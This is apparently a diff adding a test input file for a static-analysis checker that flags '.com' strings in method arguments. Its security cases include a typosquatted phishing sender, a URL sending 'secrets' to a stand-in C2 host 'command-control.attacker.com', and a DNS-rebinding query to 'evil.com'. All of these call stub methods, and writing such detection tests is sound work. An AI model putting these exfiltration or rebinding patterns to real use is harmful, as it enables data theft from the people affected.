@@ -1,0 +1,234 @@
+class DotComStrings {
+
+    // ========================================
+    // UTILITY FUNCTIONS DECLARATIONS
+    // ========================================
+
+    sendEmail(recipient, subject) { }
+    navigateTo(url) { }
+    connectToServer(endpoint) { }
+    queryDNS(domain) { }
+    logAccess(target) { }
+    validateDomain(hostname) { }
+
+    // ========================================
+    // CASE 1: Direct .com Domains
+    // ========================================
+
+    /*
+     * Simple case: Direct .com domain in string constants.
+     * DotComStringChecker should detect the .com suffix.
+     */
+    directDotCom() {
+        def website = "www.example.com";
+        this.navigateTo(website);
+        // WARNING: parameter contains .com
+        return;
+    }
+
+    directDotComEmail() {
+        def recipient = "admin@company.com";
+        def subject = "Security Alert";
+        this.sendEmail(recipient, subject);
+        // WARNING: 1st parameter contains .com
+        return;
+    }
+
+    // ========================================
+    // CASE 2: Email Address Construction
+    // ========================================
+
+    /*
+     * Real-world scenario: Building email addresses dynamically.
+     * Common in user registration, newsletter systems, etc.
+     * The .com suffix persists through concatenation.
+     */
+    buildEmailAddress() {
+        def username = "john.doe";
+        def separator = "@";
+        def domain = "enterprise.com";
+
+        def fullEmail = username + separator + domain;
+        // Result: "john.doe@enterprise.com"
+
+        this.sendEmail(fullEmail, "Welcome");
+        // WARNING: 1st parameter contains .com
+        return;
+    }
+
+    /*
+     * Corporate email system with subdomain concatenation.
+     */
+    corporateEmailSystem() {
+        def employee = "alice";
+        def department = "engineering";
+        def company = "techcorp.com";
+
+        def emailAddr = employee + "." + department + "@" + company;
+        // Result: "alice.engineering@techcorp.com"
+
+        this.sendEmail(emailAddr, "Team Update");
+        // WARNING: 1st parameter contains .com
+        return;
+    }
+
+    // ========================================
+    // CASE 3: Conditional Domain Selection
+    // ========================================
+
+    /*
+     * Load balancing across different .com servers.
+     * Both branches end with .com, so merge preserves suffix.
+     */
+    serverSelection(useBackup) {
+        def targetServer = "";
+
+        if (useBackup > 0) {
+            targetServer = "backup.cdn-provider.com";
+        } else {
+            targetServer = "primary.cdn-provider.com";
+        }
+
+        this.connectToServer(targetServer);
+        // WARNING: parameter contains .com
+        return;
+    }
+
+    /*
+     * Region-based CDN selection with multiple .com domains.
+     */
+    cdnRouter(region) {
+        def cdn = "";
+
+        if (region == 1) {
+            cdn = "eu-west.cloudflare.com";
+        } else {
+            if (region == 2) {
+                cdn = "us-east.cloudflare.com";
+            } else {
+                cdn = "ap-south.cloudflare.com";
+            }
+        }
+
+        this.connectToServer(cdn);
+        // WARNING: parameter contains .com
+        return;
+    }
+
+    // ========================================
+    // CASE 4: Security Scenarios (Phishing, Exfiltration)
+    // ========================================
+
+    /*
+     * SECURITY RISK: Typosquatting / Phishing Detection
+     *
+     * Attackers register domains similar to legitimate brands
+     * to deceive users (e.g., "paypa1.com" instead of "paypal.com").
+     * The DotComStringChecker can be configured to flag ALL .com
+     * domains as potentially suspicious in high-security contexts,
+     * requiring explicit allowlisting.
+     */
+    phishingEmailDetection() {
+        // Typosquatting: digit '1' instead of letter 'l'
+        def suspiciousSender = "security@paypa1.com";
+        def phishingBody = "Verify your account immediately!";
+
+        this.sendEmail(suspiciousSender, phishingBody);
+        // WARNING: 1st parameter contains .com (potential phishing)
+        return;
+    }
+
+    /*
+     * SECURITY RISK: Data Exfiltration Detection
+     *
+     * Malicious code attempts to send sensitive data to an
+     * external .com domain controlled by the attacker.
+     * Detecting .com in outbound connections can help identify
+     * data exfiltration attempts, especially if combined with
+     * DLP (Data Loss Prevention) policies.
+     */
+    dataExfiltrationAttempt() {
+        def attackerC2 = "command-control.attacker.com";
+        def stolenData = "/v1/exfiltrate/secrets";
+
+        def exfilURL = attackerC2 + stolenData;
+        // Result: "command-control.attacker.com/v1/exfiltrate/secrets"
+
+        this.connectToServer(exfilURL);
+        // WARNING: parameter contains .com (exfiltration risk!)
+        return;
+    }
+
+    /*
+     * SECURITY RISK: DNS Rebinding Attack Preparation
+     *
+     * Attacker-controlled .com domain used in DNS rebinding.
+     * The checker can flag suspicious .com domains being queried,
+     * especially when combined with rapid DNS changes.
+     */
+    dnsRebindingSetup() {
+        def maliciousDomain = "rebind-attack.evil.com";
+
+        this.queryDNS(maliciousDomain);
+        // WARNING: parameter contains .com (DNS attack vector)
+        return;
+    }
+
+    // ========================================
+    // CASE 5: Safe Patterns (Trusted TLDs)
+    // ========================================
+
+    /*
+     * Government domains (.gov) are generally more trusted.
+     * Should NOT trigger DotComStringChecker.
+     */
+    governmentService() {
+        def govSite = "www.irs.gov";
+        def taxInfo = "/file-taxes";
+
+        def fullURL = govSite + taxInfo;
+
+        this.navigateTo(fullURL);
+        // OK: .gov TLD, not .com
+        return;
+    }
+
+    /*
+     * Educational institutions (.edu) are trusted domains.
+     * Should NOT trigger DotComStringChecker.
+     */
+    educationalResource() {
+        def university = "research.mit.edu";
+        def repository = "/papers/ml-thesis.pdf";
+
+        def resourceURL = university + repository;
+
+        this.navigateTo(resourceURL);
+        // OK: .edu TLD, not .com
+        return;
+    }
+
+    /*
+     * Non-profit organizations often use .org.
+     * Should NOT trigger DotComStringChecker.
+     */
+    nonprofitSite() {
+        def nonprofit = "donations.redcross.org";
+
+        this.validateDomain(nonprofit);
+        // OK: .org TLD, not .com
+        return;
+    }
+
+    /*
+     * Internal corporate domains (.internal, .corp, .local)
+     * are safe and should NOT trigger the checker.
+     */
+    internalCorporateDomain() {
+        def intranet = "portal.company.internal";
+
+        this.connectToServer(intranet);
+        // OK: .internal TLD, not .com
+        return;
+    }
+}
